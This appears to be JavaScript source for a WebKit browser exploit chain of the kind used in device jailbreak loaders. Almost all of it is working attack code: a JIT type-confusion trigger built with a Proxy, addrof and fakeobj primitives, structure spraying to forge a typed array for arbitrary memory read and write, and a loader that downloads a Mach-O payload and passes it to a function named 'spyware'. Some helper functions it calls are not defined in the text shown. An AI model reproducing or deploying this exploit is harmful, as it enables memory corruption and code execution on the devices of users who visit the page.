const ITERS = 1e4;
const ALLOCS = 1e3;
const conversion_buffer = new ArrayBuffer(8);
const f64 = new Float64Array(conversion_buffer);
const i32 = new Uint32Array(conversion_buffer);
const BASE32 = 4294967296;
function f2i(f) {
  f64[0] = f;
  return i32[0] + BASE32 * i32[1];
}
function i2f(i) {
  i32[0] = i % BASE32;
  i32[1] = i / BASE32;
  return f64[0];
}
function hexit(x) {
  if (x < 0) return `-${hex(-x)}`;
  return `0x${x.toString(16)}`;
}
function xor(a, b) {
  let res = 0, base = 1;
  for (let i = 0; i < 64; ++i) {
    res += base * ((a & 1) ^ (b & 1));
    a = (a - (a & 1)) / 2;
    b = (b - (b & 1)) / 2;
    base *= 2;
  }
  return res;
}
counter = 0;
function trigger(constr, modify, res, val) {
  return eval(
    `\n    var o = [13.37]\n    var Constructor${counter} = function(o) { ${constr} }\n\n    var hack = false\n\n    var Wrapper = new Proxy(Constructor${counter}, {\n        get: function() {\n            if (hack) {\n                ${modify}\n            }\n        }\n    })\n\n    for (var i = 0; i < ITERS; ++i)\n        new Wrapper(o)\n\n    hack = true\n    var bar = new Wrapper(o)\n    ${res}\n    `
  );
}
function pwn(binary) {
  const stage1 = {
    addrof(victim) {
      return f2i(
        trigger("this.result = o[0]", "o[0] = val", "bar.result", victim)
      );
    },
    fakeobj(addr) {
      return trigger("o[0] = val", "o[0] = {}", "o[0]", i2f(addr));
    },
    test() {
      const addr = this.addrof({ a: 4919 });
      const x = this.fakeobj(addr);
      if (x.a != 4919)
        fail(
          "webkit exploit failed: please reload the page or restart the app and wait a few seconds before retrying"
        );
    },
  };
  stage1.test();
  const memory = get_mem_old(stage1);
  let addrfake;
  if (memory.hasOwnProperty("fakeobj") && memory.hasOwnProperty("addrof"))
    addrfake = memory;
  else addrfake = stage1;
  spyware(addrfake, memory, binary);
}
function get_mem_old(stage1) {
  const structs = [];
  function sprayStructures() {
    function randomString() {
      return Math.random()
        .toString(36)
        .replace(/[^a-z]+/g, "")
        .substr(0, 5);
    }
    for (let i = 0; i < 4096; i++) {
      const a = new Float64Array(1);
      a[randomString()] = 1337;
      structs.push(a);
    }
  }
  sprayStructures();
  const hax = new Uint8Array(4096);
  const jsCellHeader = new Int64([0, 16, 0, 0, 0, 39, 24, 1]);
  const container = {
    jsCellHeader: jsCellHeader.asJSValue(),
    butterfly: false,
    vector: hax,
    lengthAndFlags: new Int64("0x0001000000000010").asJSValue(),
  };
  const address = Add(stage1.addrof(container), 16);
  const fakearray = stage1.fakeobj(address);
  while (!(fakearray instanceof Float64Array)) {
    jsCellHeader.assignAdd(jsCellHeader, Int64.One);
    container.jsCellHeader = jsCellHeader.asJSValue();
  }
  memory = {
    read(addr, length) {
      fakearray[2] = i2f(addr);
      const a = new Array(length);
      for (let i = 0; i < length; i++) a[i] = hax[i];
      return a;
    },
    readInt64(addr) {
      return new Int64(this.read(addr, 8));
    },
    write(addr, data) {
      fakearray[2] = i2f(addr);
      for (let i = 0; i < data.length; i++) hax[i] = data[i];
    },
    writeInt64(addr, val) {
      return this.write(addr, val.bytes());
    },
  };
  const empty = {};
  let header = memory.read(stage1.addrof(empty), 8);
  memory.write(stage1.addrof(container), header);
  const f64array = new Float64Array(8);
  header = memory.read(stage1.addrof(f64array), 16);
  memory.write(stage1.addrof(fakearray), header);
  memory.write(Add(stage1.addrof(fakearray), 24), [16, 0, 0, 0, 1, 0, 0, 0]);
  fakearray.container = container;
  return memory;
}
function get_mem_new(stage1) {
  const FPO = typeof SharedArrayBuffer === "undefined" ? 24 : 16;
  const structure_spray = [];
  for (let i = 0; i < 1e3; ++i) {
    const ary = { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6, g: 268435455 };
    ary[`prop${i}`] = 1;
    structure_spray.push(ary);
  }
  const manager = structure_spray[500];
  const leak_addr = stage1.addrof(manager);
  function alloc_above_manager(expr) {
    let res;
    do {
      for (let i = 0; i < ALLOCS; ++i) structure_spray.push(eval(expr));
      res = eval(expr);
    } while (stage1.addrof(res) < leak_addr);
    return res;
  }
  const unboxed_size = 100;
  const unboxed = alloc_above_manager(`[${"13.37,".repeat(unboxed_size)}]`);
  const boxed = alloc_above_manager("[{}]");
  const victim = alloc_above_manager("[]");
  victim.p0 = 4919;
  function victim_write(val) {
    victim.p0 = val;
  }
  function victim_read() {
    return victim.p0;
  }
  i32[0] = 512;
  i32[1] = 17309703 - 65536;
  const outer = { p0: 0, p1: f64[0], p2: manager, p3: 268435455 };
  const fake_addr = stage1.addrof(outer) + FPO + 8;
  const unboxed_addr = stage1.addrof(unboxed);
  const boxed_addr = stage1.addrof(boxed);
  const victim_addr = stage1.addrof(victim);
  const holder = { fake: {} };
  holder.fake = stage1.fakeobj(fake_addr);
  const shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8]);
  const boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8];
  holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly);
  const victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8];
  function set_victim_addr(where) {
    holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 16);
  }
  function reset_victim_addr() {
    holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly;
  }
  const stage2 = {
    addrof(victim) {
      boxed[0] = victim;
      return f2i(unboxed[0]);
    },
    fakeobj(addr) {
      unboxed[0] = new Int64(addr).asDouble();
      return boxed[0];
    },
    write64(where, what) {
      set_victim_addr(where);
      victim_write(this.fakeobj(what));
      reset_victim_addr();
    },
    read64(where) {
      set_victim_addr(where);
      const res = this.addrof(victim_read());
      reset_victim_addr();
      return res;
    },
    writeInt64(where, what) {
      set_victim_addr(where);
      victim_write(this.fakeobj(f2i(what.asDouble())));
      reset_victim_addr();
    },
    readInt64(where) {
      set_victim_addr(where);
      const res = this.addrof(victim_read());
      reset_victim_addr();
      return new Int64(res);
    },
    read(addr, length) {
      const a = new Array(length);
      let i;
      for (i = 0; i + 8 < length; i += 8) {
        v = this.readInt64(addr + i).bytes();
        for (var j = 0; j < 8; j++) a[i + j] = v[j];
      }
      v = this.readInt64(addr + i).bytes();
      for (var j = i; j < length; j++) a[j] = v[j - i];
      return a;
    },
    write(addr, data) {
      throw "maybe later";
    },
  };
  return stage2;
}
function go() {
  try {
    const req = new XMLHttpRequest();
    req.open("GET", "payload");
    req.responseType = "arraybuffer";
    req.addEventListener("load", () => {
      try {
        if (req.responseType != "arraybuffer") throw "y u no blob";
        const arrayBuf = new Uint8Array(req.response);
        const header = b2u32(arrayBuf.slice(0, 4));
        if (header != 4277009103) {
          fail(
            `header is invalid: ${hexit(header)}, should be 0xfeedfacf\nwtf is your payload??`
          );
          return;
        }
        pwn(arrayBuf);
      } catch (e) {
        fail(`Error: ${e}${e != null ? `\n${e.stack}` : ""}`);
      }
    });
    req.addEventListener("error", ev => {
      fail(ev);
    });
    req.send();
  } catch (e) {
    fail(`Error: ${e}${e != null ? `\n${e.stack}` : ""}`);
  }
}
